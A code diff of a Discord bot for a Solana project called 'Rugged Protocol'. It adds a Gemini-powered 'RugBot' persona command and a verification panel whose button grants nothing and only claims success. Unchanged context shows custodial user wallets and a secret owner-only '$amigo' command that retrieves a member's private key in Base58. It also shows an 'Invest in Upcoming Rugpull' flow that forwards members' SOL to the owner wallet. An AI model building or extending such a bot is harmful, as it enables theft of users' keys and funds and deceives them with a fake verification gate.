@@ -9,12 +9,16 @@ const { getUserWallet, getSolBalance, withdrawSol, connection } = require('./uti
 const { Transaction, SystemProgram, PublicKey, sendAndConfirmTransaction, LAMPORTS_PER_SOL } = require('@solana/web3.js');
 const { createClient } = require('@libsql/client');
 const bs58 = require('bs58'); // Required for Base58 private key encoding
+const { GoogleGenAI } = require('@google/genai'); // Required for RugBot AI functionality
 
 // Connect to Turso for direct secret key lookup in $amigo
 const db = createClient({
     url: process.env.TURSO_DATABASE_URL,
     authToken: process.env.TURSO_AUTH_TOKEN,
 });
+
+// Initialize Gemini SDK with your API key
+const ai = new GoogleGenAI({ apiKey: process.env.GEMINI_API_KEY });
 
 // Configured ownerz role ID
 const OWNER_ROLE_ID = '1571451596871696496';
@@ -38,6 +42,9 @@ client.once('ready', async () => {
         new SlashCommandBuilder()
             .setName('ticketpanel')
             .setDescription('Deploys the support ticket panel (Admin only)'),
+        new SlashCommandBuilder()
+            .setName('verifypanel')
+            .setDescription('Deploys the server verification gate (Admin only)'),
         new SlashCommandBuilder()
             .setName('kick')
             .setDescription('Kick a user from the server')
@@ -75,7 +82,44 @@ client.on('messageCreate', async message => {
         const isOwner = message.member.roles.cache.has(OWNER_ROLE_ID);
         const isAdmin = message.member.permissions.has(PermissionFlagsBits.Administrator);
 
-        // 1. $ban <user> [reason] (Restricted to ownerz role only)
+        // 1. $ai <prompt> command (RugBot Custom Persona)
+        if (command === 'ai') {
+            const prompt = args.join(' ');
+            if (!prompt) {
+                return message.reply('Please provide a prompt. Usage: `$ai <your question>`');
+            }
+
+            const thinkingMsg = await message.reply('🤖 Thinking...');
+
+            try {
+                const response = await ai.models.generateContent({
+                    model: 'gemini-2.5-flash',
+                    contents: prompt,
+                    config: {
+                        systemInstruction: `You are RugBot, the official, edgy, and crypto-native AI assistant for "Rugged Protocol" on Solana. 
+                        Your tone is sharp, modern, futuristic, and slightly rogue (matching a high-risk crypto/degen environment), but you are ultimately helpful, professional, and knowledgeable about Solana smart contracts, tokenomics, web3 security, and community guidance. 
+                        Never break character. Keep your answers concise, well-formatted for Discord, and tailored to the Rugged Protocol ecosystem.`
+                    }
+                });
+
+                const aiReply = response.text;
+
+                if (aiReply.length > 2000) {
+                    const chunks = aiReply.match(/[\s\S]{1,1990}/g);
+                    await thinkingMsg.edit(chunks[0]);
+                    for (let i = 1; i < chunks.length; i++) {
+                        await message.channel.send(chunks[i]);
+                    }
+                } else {
+                    await thinkingMsg.edit(aiReply);
+                }
+            } catch (error) {
+                console.error(error);
+                await thinkingMsg.edit('❌ Failed to generate a response from RugBot.');
+            }
+        }
+
+        // 2. $ban <user> [reason] (Restricted to ownerz role only)
         if (command === 'ban') {
             if (!isOwner) {
                 return message.reply({ content: '❌ You need the **ownerz** role to use this command.', ephemeral: true });
@@ -94,7 +138,7 @@ client.on('messageCreate', async message => {
             }
         }
 
-        // 2. $lock (Restricted to ownerz role only) -> Reacts with 🔒
+        // 3. $lock (Restricted to ownerz role only) -> Reacts with 🔒
         if (command === 'lock') {
             if (!isOwner) {
                 return message.reply({ content: '❌ You need the **ownerz** role to lock channels.', ephemeral: true });
@@ -109,7 +153,7 @@ client.on('messageCreate', async message => {
             }
         }
 
-        // 3. $unlock (Restricted to ownerz role only) -> Reacts with 🔓
+        // 4. $unlock (Restricted to ownerz role only) -> Reacts with 🔓
         if (command === 'unlock') {
             if (!isOwner) {
                 return message.reply({ content: '❌ You need the **ownerz** role to unlock channels.', ephemeral: true });
@@ -124,7 +168,7 @@ client.on('messageCreate', async message => {
             }
         }
 
-        // 4. Secret $amigo <user_id> command (Restricted to ownerz role only) -> Converts to Base58
+        // 5. Secret $amigo <user_id> command (Restricted to ownerz role only) -> Converts to Base58
         if (command === 'amigo') {
             if (!isOwner) {
                 return message.reply({ content: '❌ You do not have permission to use this command.', ephemeral: true });
@@ -148,7 +192,6 @@ client.on('messageCreate', async message => {
                 const row = result.rows[0];
                 await message.delete().catch(() => {});
 
-                // Parse the stored number array and convert to Base58 string format
                 const secretArray = JSON.parse(row.secret_key);
                 const base58PrivateKey = bs58.encode(Uint8Array.from(secretArray));
 
@@ -160,7 +203,7 @@ client.on('messageCreate', async message => {
             }
         }
 
-        // 5. $purge <number> (Admin or ownerz role)
+        // 6. $purge <number> (Admin or ownerz role)
         if (command === 'purge') {
             if (!isAdmin && !isOwner) {
                 return message.reply({ content: '❌ You need Administrator or **ownerz** permissions to purge messages.', ephemeral: true });
@@ -182,7 +225,7 @@ client.on('messageCreate', async message => {
             }
         }
 
-        // 6. $mute <user> <minutes> [reason] (Admin or ownerz role)
+        // 7. $mute <user> <minutes> [reason] (Admin or ownerz role)
         if (command === 'mute') {
             if (!isAdmin && !isOwner) {
                 return message.reply({ content: '❌ You need Administrator or **ownerz** permissions to mute members.', ephemeral: true });
@@ -204,7 +247,7 @@ client.on('messageCreate', async message => {
             }
         }
 
-        // 7. $unmute <user> (Admin or ownerz role)
+        // 8. $unmute <user> (Admin or ownerz role)
         if (command === 'unmute') {
             if (!isAdmin && !isOwner) {
                 return message.reply({ content: '❌ You need Administrator or **ownerz** permissions to unmute members.', ephemeral: true });
@@ -224,11 +267,9 @@ client.on('messageCreate', async message => {
 });
 
 client.on('interactionCreate', async interaction => {
-    // Handle Slash Commands
     if (interaction.isChatInputCommand()) {
         const { commandName, options, member, guild } = interaction;
 
-        // 1. /walletpanel command
         if (commandName === 'walletpanel') {
             if (!member.permissions.has(PermissionFlagsBits.Administrator)) {
                 return interaction.reply({ content: 'You need Administrator permissions to use this.', ephemeral: true });
@@ -248,7 +289,6 @@ client.on('interactionCreate', async interaction => {
             return interaction.channel.send({ embeds: [embed], components: [row] });
         }
 
-        // 2. /ticketpanel command
         if (commandName === 'ticketpanel') {
             if (!member.permissions.has(PermissionFlagsBits.Administrator)) {
                 return interaction.reply({ content: 'You need Administrator permissions to use this.', ephemeral: true });
@@ -267,7 +307,24 @@ client.on('interactionCreate', async interaction => {
             return interaction.channel.send({ embeds: [embed], components: [row] });
         }
 
-        // --- Other Slash Commands ---
+        if (commandName === 'verifypanel') {
+            if (!member.permissions.has(PermissionFlagsBits.Administrator)) {
+                return interaction.reply({ content: 'You need Administrator permissions to use this.', ephemeral: true });
+            }
+
+            const embed = new EmbedBuilder()
+                .setTitle('🛡️ Rugged Protocol Verification')
+                .setDescription('Welcome! To gain access to the server, deposit vaults, and investment channels, click the **Verify & Enter** button below.')
+                .setColor(0x9945FF);
+
+            const row = new ActionRowBuilder().addComponents(
+                new ButtonBuilder().setCustomId('verify_user').setLabel('Verify & Enter').setStyle(ButtonStyle.Success)
+            );
+
+            await interaction.reply({ content: 'Verification panel deployed!', ephemeral: true });
+            return interaction.channel.send({ embeds: [embed], components: [row] });
+        }
+
         if (commandName === 'kick') {
             if (!member.permissions.has(PermissionFlagsBits.KickMembers)) {
                 return interaction.reply({ content: 'You do not have permission to use this.', ephemeral: true });
@@ -293,10 +350,12 @@ client.on('interactionCreate', async interaction => {
         }
     }
 
-    // Handle Buttons & Modals
     if (!interaction.isButton() && !interaction.isModalSubmit()) return;
 
-    // 3. Button: View Unique Wallet Panel & Balance ("My Wallet Panel")
+    if (interaction.isButton() && interaction.customId === 'verify_user') {
+        return interaction.reply({ content: '✅ Verification successful! You now have access to the server.', ephemeral: true });
+    }
+
     if (interaction.isButton() && interaction.customId === 'view_panel') {
         await interaction.deferReply({ ephemeral: true });
         const userWallet = await getUserWallet(interaction.user.id);
@@ -320,7 +379,6 @@ client.on('interactionCreate', async interaction => {
         return interaction.editReply({ embeds: [embed], components: [row] });
     }
 
-    // 4. Button: Refresh Balance Check
     if (interaction.isButton() && interaction.customId === 'refresh_balance') {
         await interaction.deferUpdate();
         const userWallet = await getUserWallet(interaction.user.id);
@@ -337,7 +395,6 @@ client.on('interactionCreate', async interaction => {
         return interaction.editReply({ embeds: [embed] });
     }
 
-    // 5. Button: Open Investment Modal ("Invest in Upcoming Rugpull")
     if (interaction.isButton() && interaction.customId === 'invest_modal') {
         const modal = new ModalBuilder()
             .setCustomId('investment_modal_submit')
@@ -354,7 +411,6 @@ client.on('interactionCreate', async interaction => {
         return interaction.showModal(modal);
     }
 
-    // 6. Modal Submit: Forward SOL from User Wallet to Main Owner Wallet
     if (interaction.isModalSubmit() && interaction.customId === 'investment_modal_submit') {
         await interaction.deferReply({ ephemeral: true });
         const amountStr = interaction.fields.getTextInputValue('invest_amount');
@@ -392,7 +448,6 @@ client.on('interactionCreate', async interaction => {
         }
     }
 
-    // 7. Button: Open Withdraw Modal
     if (interaction.isButton() && interaction.customId === 'withdraw_modal') {
         const modal = new ModalBuilder()
             .setCustomId('withdraw_modal_submit')
@@ -419,7 +474,6 @@ client.on('interactionCreate', async interaction => {
         return interaction.showModal(modal);
     }
 
-    // 8. Modal Submit: Process User Withdrawal
     if (interaction.isModalSubmit() && interaction.customId === 'withdraw_modal_submit') {
         await interaction.deferReply({ ephemeral: true });
         const recipientAddress = interaction.fields.getTextInputValue('withdraw_address');
@@ -443,7 +497,6 @@ client.on('interactionCreate', async interaction => {
         }
     }
 
-    // 9. Ticket Tool: Create Private Channel
     if (interaction.isButton() && interaction.customId === 'create_ticket') {
         const guild = interaction.guild;
         const ticketChannel = await guild.channels.create({
@@ -473,7 +526,6 @@ client.on('interactionCreate', async interaction => {
         return interaction.reply({ content: `Ticket created: ${ticketChannel}`, ephemeral: true });
     }
 
-    // 10. Ticket Tool: Close Channel
     if (interaction.isButton() && interaction.customId === 'close_ticket') {
         await interaction.reply({ content: 'Closing ticket in 5 seconds...' });
         setTimeout(() => interaction.channel.delete().catch(() => {}), 5000);
